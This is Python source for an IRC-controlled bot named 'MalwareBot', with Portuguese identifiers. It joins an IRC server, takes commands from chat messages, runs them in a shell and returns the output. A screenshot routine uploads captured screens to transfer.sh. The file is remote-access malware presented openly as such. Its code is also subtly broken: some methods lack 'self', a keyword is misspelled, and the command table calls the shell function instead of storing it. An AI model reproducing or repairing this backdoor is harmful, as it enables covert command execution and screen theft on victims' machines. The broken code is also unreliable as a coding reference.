import socket
import re
from subprocess import run, PIPE, STDOUT
from winreg import REG_FULL_RESOURCE_DESCRIPTOR
import numpy as np
import cv2
import requests
import pyautogui

class ConexaoAtacante:
    def __init__(self, endereco_irc, nick):
        self.socket = socket.socket()
        self.socket.connect(endereco_irc)
        self.registra_usuario(nick)
        self.nick = nick
    
    def envia_comando(self, cmd):
        cmd += '\r\n'
        self.socket.send(cmd.encode('utf8'))
    
    def parse_msg(self, msg):
        match = re.match(':(.*)!.*@.*(?:\..*)* PRIVMSG {} :(.*)\r\n'.format(self.nick, msg))
        return match    

    def recebe_comando(self):
        msg = self.socket.recv(4096).decode('utf8', errors='ignore')
        #msg = msg.decode('utf8', errors='ignore')
        self.responde_ping(msg)
        msg_match = self.parse_msg(msg)
        if msg_match:
            return msg_match.groups()
        return None, None
    
    def registra_usuario(self, nick):
        self.envia_comando('NICK ' + nick)
        self.envia_comando('USER {0} {0} {0} :{0}'.format(nick))
        
    def responde_ping(self, msg):
        match = re.match('PING :(.*)', msg)
        if match:
            pong = match.group(1)
            self.envia_comando('PONG: ' + pong)
    
    def roda_comando_no_shell(cmd):
        processo_completo = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        resposta = processo_completo.stdout.decode('cp1252', erroros='ignore')
        return resposta
    
    def tira_screenshot(filename, nick):
        filename = '{}_print.png'.format(nick)
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image),
                            cv2.COLOR_RGB2BGR)
        
        cv2.imwrite(filename, image)
        with open(filename, 'rb') as f:
            r = requests.post('https://transfer.sh', files={filename: f})
            resposta = r.text if r.status_code == 200 else 'erro no upload'
            print(resposta)
            
conexao = ConexaoAtacante(('irc.python.net', 6667), 'MalwareBot')
comandos = {'!shell':conexao.roda_comando_no_shell()}
re_comandos = '|'.join(comandos.keys())
while True:
    #cmd = conexao.recebe_comando()
    nick_recebido, cmd = conexao.recebe_comando()
    cmd_match = re.match('({})(?: (.*))?'.format(re_comandos), cmd)
    if cmd_match:
        cmd_tipo, args = cmd_match.groups()
        resposta = comandos[cmd_tipo](args)
    else:
        resposta = 'Comando n√£o encontrado'
    conexao.envia_comando('PRIVMSG {} :{}'.format(nick_recebido, resposta))